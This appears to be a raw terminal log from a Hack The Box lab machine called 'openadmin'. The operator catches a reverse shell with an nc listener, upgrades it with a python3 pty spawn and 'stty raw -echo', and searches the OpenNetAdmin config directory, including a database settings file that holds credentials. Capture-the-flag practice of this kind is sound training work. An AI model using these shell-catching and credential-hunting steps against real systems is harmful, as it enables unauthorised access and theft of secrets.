@@ -1,0 +1,62 @@
+┌─[root@parrot]─[~/hackthebox/openadmin]     
+└──╼ #nc -nvlp 9001                          
+Ncat: Version 7.80 ( https://nmap.org/ncat ) 
+Ncat: Listening on :::9001                   
+Ncat: Listening on 0.0.0.0:9001              
+Ncat: Connection from 10.10.10.171.          
+Ncat: Connection from 10.10.10.171:40148.    
+Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux                                                                  
+ 17:31:28 up  3:41,  2 users,  load average: 0.02, 0.02, 0.00                              
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                        
+jimmy    pts/0    10.10.14.18      16:20   25.00s  0.19s  0.17s -bash                      
+jimmy    pts/2    10.10.14.18      16:36   30.00s  0.47s  0.47s -bash                      
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                                      
+/bin/sh: 0: can't access tty; job control turned off                                       
+$ python -c "import pty ;pty.spawn('/bin/bash')"                                           
+/bin/sh: 1: python: not found                
+$ python3 -c "import pty ;pty.spawn('/bin/bash')"                                          
+www-data@openadmin:/$ ^Z                     
+[1]+  Stopped                 nc -nvlp 9001  
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin] 
+└──╼ #stty raw -echo                         
+┌─[root@parrot]─[~/hackthebox/openadmin]     
+└──╼ #nc -nvlp 9001                          
+
+www-data@openadmin:/$                        
+www-data@openadmin:/$ ls                     
+bin    dev   initrd.img      lib64       mnt   root  snap      sys  var                    
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz                
+cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old            
+www-data@openadmin:/$ cd /opt/ona/www/local/config                                         
+www-data@openadmin:/opt/ona/www/local/config$ ls                                           
+database_settings.inc.php  motd.txt.example  run_installer                                 
+www-data@openadmin:/opt/ona/www/local/config$ export TERM=screen-256color                  
+www-data@openadmin:/opt/ona/www/local/config$ ls                                           
+database_settings.inc.php  motd.txt.example  run_installer                                 
+www-data@openadmin:/opt/ona/www/local/config$ clear                                        
+www-data@openadmin:/opt/ona/www/local/config$ ls                                           
+database_settings.inc.php  motd.txt.example  run_installer                                 
+www-data@openadmin:/opt/ona/www/local/config$ less database_settings.inc.php               
+www-data@openadmin:/opt/ona/www/local/config$ less motd.txt.example                        
+www-data@openadmin:/opt/ona/www/local/config$ file run_installer                           
+run_installer: empty                         
+www-data@openadmin:/opt/ona/www/local/config$ ls -la                                       
+total 16                                     
+drwxrwxr-x 2 www-data www-data 4096 Nov 21 16:51 .                                         
+drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..                                        
+-rw-r--r-- 1 www-data www-data  426 Nov 21 16:51 database_settings.inc.php                 
+-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example                          
+-rw-r--r-- 1 www-data www-data    0 Nov 21 16:28 run_installer                             
+www-data@openadmin:/opt/ona/www/local/config$ less database_settings.inc.php               
+www-data@openadmin:/opt/ona/www/local/config$ cd ..                                        
+www-data@openadmin:/opt/ona/www/local$ ls -la
+total 20                                     
+drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 .                                        
+drwxrwxr-x 10 www-data www-data 4096 Nov 22 17:17 ..                                       
+drwxrwxr-x  2 www-data www-data 4096 Nov 21 16:51 config                                   
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 nmap_scans                               
+drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 plugins                                  
+www-data@openadmin:/opt/ona/www/local$ sudo jimmy                                          
+sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted                             
+sudo: unable to initialize policy plugin     
+www-data@openadmin:/opt/ona/www/local$       
